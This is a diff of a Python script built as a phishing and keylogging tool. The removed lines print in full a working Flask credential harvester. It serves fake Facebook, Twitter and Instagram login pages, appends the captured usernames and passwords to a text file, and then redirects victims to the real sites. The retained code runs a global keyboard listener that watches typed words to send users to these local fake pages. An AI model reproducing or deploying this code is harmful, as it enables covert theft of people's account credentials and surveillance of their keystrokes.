@@ -3,10 +3,6 @@ from pynput.keyboard import Key, Listener
 import webbrowser
 import threading
 
-app = Flask(__name__)
-
-app.config['DEBUG'] = True
-
 current_keys = []
 trigger_words = {
     'facebook': 'http://127.0.0.1:5000/facebook',
@@ -43,47 +39,5 @@ def start_listener():
     with Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
 
-@app.route('/')
-def home():
-    return redirect(url_for('fake_facebook'))
-
-@app.route('/facebook')
-def fake_facebook():
-    return render_template('facebook.html')
-
-@app.route('/twitter')
-def fake_twitter():
-    return render_template('twitter.html')
-
-@app.route('/instagram')
-def fake_instagram():
-    return render_template('instagram.html')
-
-@app.route('/login', methods=['POST'])
-def login():
-    # Vérifiez que tous les champs nécessaires sont présents
-    if 'username' in request.form and 'password' in request.form and 'origin' in request.form:
-        username = request.form['username']
-        password = request.form['password']
-        origin = request.form['origin']
-
-        print(f"Received username: {username} and password: {password} from {origin}")
-        with open('login_data.txt', 'a') as file:
-            file.write(f'Username: {username}, Password: {password}, Origin: {origin}\n')
-
-        # Redirection vers la vraie page de connexion
-        if origin == 'facebook':
-            return redirect('https://www.facebook.com/login')
-        elif origin == 'twitter':
-            return redirect('https://twitter.com/login')
-        elif origin == 'instagram':
-            return redirect('https://www.instagram.com/accounts/login/')
-        else:
-            return redirect(url_for('home'))  # Fallback si l'origine n'est pas connue
-    else:
-        return "Missing data", 400
 
 threading.Thread(target=start_listener).start()
-
-if __name__ == "__main__":
-    app.run()
